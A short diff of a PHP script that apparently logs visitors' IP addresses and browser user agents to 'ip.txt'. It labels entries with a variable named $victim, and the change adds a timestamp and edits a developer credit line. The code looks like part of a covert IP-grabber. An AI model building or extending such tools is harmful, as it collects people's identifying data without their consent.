@@ -18,7 +18,8 @@ $browser = $_SERVER['HTTP_USER_AGENT'];
 
 $file = 'ip.txt';
 $victim = "IP: ";
-$dev = "\nDeveloper : Mukesh Mahato\r\n";
+$date = date('dMYHis');
+$dev = "Developer : Mukesh Mahato\r\n";
 $fp = fopen($file, 'a');
 
 fwrite($fp, $dev);
